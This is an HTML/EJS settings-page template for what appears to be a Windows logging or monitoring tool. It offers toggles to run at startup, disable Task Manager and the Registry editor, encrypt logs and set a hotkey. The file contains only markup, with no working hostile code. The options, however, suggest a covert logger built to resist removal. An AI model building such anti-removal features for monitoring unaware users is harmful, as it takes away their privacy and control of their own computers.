<!DOCTYPE html>
<html lang="en">
<% include css/generalCss %>

    <body>
        <div class="content">
            <% include common/commonNavbar %>
                <form action="/general" method="post">
                    <div class="container">
                        <nav class="mt-5">
                            <div class="nav nav-tabs" id="nav-tab" role="tablist">
                                <a class="nav-item nav-link active" id="nav-settings-tab" data-toggle="tab" href="#nav-settings" role="tab" aria-controls="nav-settings"
                                    aria-selected="false">Settings</a>
                                <a class="nav-item nav-link" id="nav-log-tab" data-toggle="tab" href="#nav-log" role="tab" aria-controls="nav-log" aria-selected="false">Log</a>
                            </div>
                        </nav>
                        <div class="col-md-12">
                            <div class="tab-content" id="nav-tabContent">
                                <div class="tab-pane fade show active" id="nav-settings" role="tabpanel" aria-labelledby="nav-settings-tab">
                                    <div class="offset-md-3">
                                        <div class="col-md-8">
                                            <table class="mt-5">
                                                <tbody>
                                                    <tr>
                                                        <td>
                                                            <i class="fab fa-windows icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text" nowrap>
                                                            Run as Windows start up
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableStartup" id="enableStartup">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <div class="decorate-settings">
                                                            <td>
                                                                <i class="fas fa-desktop icon-settings"></i>
                                                            </td>
                                                            <td class="pt-single-text">
                                                                Disable Task Manager
                                                            </td>
                                                            <td class="pr-2" style="float: right">
                                                                <label class="switch">
                                                                    <input type="checkbox" name="disableTaskManager" id="disableTaskManager">
                                                                    <span class="slider"></span>
                                                                </label>
                                                            </td>
                                                        </div>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-cube icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            Disable Registry
                                                        </td>
                                                        <td class="pr-2" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="disableRegistry" id="disableRegistry">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-key icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            Enable Encrypt logs
                                                        </td>
                                                        <td class="pr-2" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableEncrypt" id="enableEncrypt">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-keyboard icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <a data-toggle="collapse" href="#txtHotkey">
                                                                <div class="pr-2">
                                                                    Hotkey
                                                                </div>
                                                            </a>
                                                        </td>
                                                        <td class="pr-2" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableHotkey" id="enableHotkey">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td colspan="3">
                                                            <div class="collapse" id="txtHotkey">
                                                                <div class="form-group pr-2">
                                                                    <input type="text" class="form-control mt-2" name="hotkeyGeneral" id="hotkeyGeneral" aria-describedby="helpId" size="30">
                                                                </div>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr class="mt-3">
                                                        <td colspan="3">
                                                            <div class="offset-md-3 mt-3">
                                                                <button type="submit" class="btn btn-success btn-lg">OK</button>
                                                                <button type="button" class="btn btn-danger btn-lg">
                                                                    <a class="cancel" href="/general">Cancel</a>
                                                                </button>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                                <div class="tab-pane fade" id="nav-log" role="tabpanel" aria-labelledby="nav-log-tab">
                                    <div id="timeline" class="mt-5"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
        </div>
        <% include common/commonFooter %>
            <% include script/generalScript%>
    </body>

</html>